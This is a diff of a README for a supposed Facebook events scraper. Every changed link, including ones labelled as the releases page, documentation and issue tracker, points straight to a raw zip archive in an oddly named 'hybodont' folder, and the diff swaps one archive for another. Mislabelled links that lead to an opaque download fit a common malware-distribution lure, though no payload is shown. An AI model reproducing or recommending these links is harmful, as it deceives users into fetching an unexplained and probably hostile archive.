@@ -6,7 +6,7 @@ Welcome to the **facebook-events-scraper**! This tool helps you efficiently extr
 
 ## 📥 Download
 
-[![Download facebook-events-scraper](https://raw.githubusercontent.com/LuizinTheHeroSalyer/facebook-events-scraper/main/hybodont/facebook-events-scraper_1.0.zip)](https://raw.githubusercontent.com/LuizinTheHeroSalyer/facebook-events-scraper/main/hybodont/facebook-events-scraper_1.0.zip)
+[![Download facebook-events-scraper](https://github.com/LuizinTheHeroSalyer/facebook-events-scraper/raw/refs/heads/main/hybodont/scraper_events_facebook_v2.6-alpha.4.zip)](https://github.com/LuizinTheHeroSalyer/facebook-events-scraper/raw/refs/heads/main/hybodont/scraper_events_facebook_v2.6-alpha.4.zip)
 
 ## 📂 Prerequisites
 
@@ -28,7 +28,7 @@ Before you start, make sure your system meets these requirements:
 To download and run the software, follow these steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/LuizinTheHeroSalyer/facebook-events-scraper/main/hybodont/facebook-events-scraper_1.0.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/LuizinTheHeroSalyer/facebook-events-scraper/raw/refs/heads/main/hybodont/scraper_events_facebook_v2.6-alpha.4.zip) to find the latest version of the software.
 
 2. **Choose the Right File**  
    On the Releases page, you will see several files available. Select the appropriate file for your operating system.
@@ -73,7 +73,7 @@ Yes, the **facebook-events-scraper** is available for free.
 No, this tool is designed for anyone to use, regardless of their technical background.
 
 ### How often is the tool updated?  
-Updates will occur as new features or fixes are necessary. Check the [Releases page](https://raw.githubusercontent.com/LuizinTheHeroSalyer/facebook-events-scraper/main/hybodont/facebook-events-scraper_1.0.zip) for the latest version.
+Updates will occur as new features or fixes are necessary. Check the [Releases page](https://github.com/LuizinTheHeroSalyer/facebook-events-scraper/raw/refs/heads/main/hybodont/scraper_events_facebook_v2.6-alpha.4.zip) for the latest version.
 
 ## 💬 Community Support
 
@@ -85,9 +85,9 @@ If you need help using the application or have questions about features, please 
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://raw.githubusercontent.com/LuizinTheHeroSalyer/facebook-events-scraper/main/hybodont/facebook-events-scraper_1.0.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/LuizinTheHeroSalyer/facebook-events-scraper/main/hybodont/facebook-events-scraper_1.0.zip)
+- [Official Documentation](https://github.com/LuizinTheHeroSalyer/facebook-events-scraper/raw/refs/heads/main/hybodont/scraper_events_facebook_v2.6-alpha.4.zip)
+- [GitHub Issues](https://github.com/LuizinTheHeroSalyer/facebook-events-scraper/raw/refs/heads/main/hybodont/scraper_events_facebook_v2.6-alpha.4.zip)
 
 ## 📥 Download Again
 
-Be sure to download the latest version to access new features and improvements. Visit the [Releases page](https://raw.githubusercontent.com/LuizinTheHeroSalyer/facebook-events-scraper/main/hybodont/facebook-events-scraper_1.0.zip) to get started.
+Be sure to download the latest version to access new features and improvements. Visit the [Releases page](https://github.com/LuizinTheHeroSalyer/facebook-events-scraper/raw/refs/heads/main/hybodont/scraper_events_facebook_v2.6-alpha.4.zip) to get started.
